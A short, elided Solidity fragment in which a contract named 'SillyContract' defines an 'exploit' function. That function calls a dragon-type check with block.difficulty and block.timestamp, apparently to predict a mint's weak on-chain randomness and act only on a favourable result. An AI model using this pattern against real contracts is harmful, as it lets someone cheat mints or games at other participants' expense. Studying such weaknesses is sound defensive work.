...
contract SillyContract {
    ...
    function dragonTypeCheck(uint mintedAt, uint difficulty, uint timestamp, uint remainingDragonSupply, uint remainingTotalSupply ) public returns(bool) {
    ...
    function exploit(uint mintedAt, uint remainingDragonSupply, uint remainingTotalSupply) public payable {
          require(dragonTypeCheck(mintedAt, block.difficulty, block.timestamp, remainingDragonSupply, remainingTotalSupply));
    }
}